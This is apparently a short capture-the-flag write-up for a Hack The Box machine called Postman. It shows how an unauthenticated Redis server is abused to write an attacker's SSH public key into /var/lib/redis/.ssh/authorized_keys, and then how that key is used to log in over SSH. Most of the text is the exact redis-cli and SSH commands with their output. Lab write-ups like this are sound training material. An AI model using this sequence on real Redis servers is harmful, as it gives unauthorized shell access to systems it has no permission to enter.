# 15 - Redis


Redis a key-value database, stored in memory.


# File upload
```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/postman]
└──╼ $ ssh-keygen -f postman
┌─[user@parrot]─[10.10.14.14]─[~/htb/postman]
└──╼ $ chmod 600 postman
┌─[user@parrot]─[10.10.14.14]─[~/htb/postman]
└──╼ $ vi postman.pub # Add 2 new lines to the bottom and the top.
┌─[user@parrot]─[10.10.14.14]─[~/htb/postman]
└──╼ $ cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit  
OK
┌─[user@parrot]─[10.10.14.14]─[~/htb/postman]
└──╼ $ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
```


Anonymous authentication is enabled, by uploading our public key to .ssh/authorized_keys, we can log in using ssh. Notice the public key needs new lines at the bottom and the top. 


# SSH
```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/postman]
└──╼ $ ssh -l redis -i postman 10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Aug 25 17:45:44 2021 from 10.10.14.14
redis@Postman:~$ 
```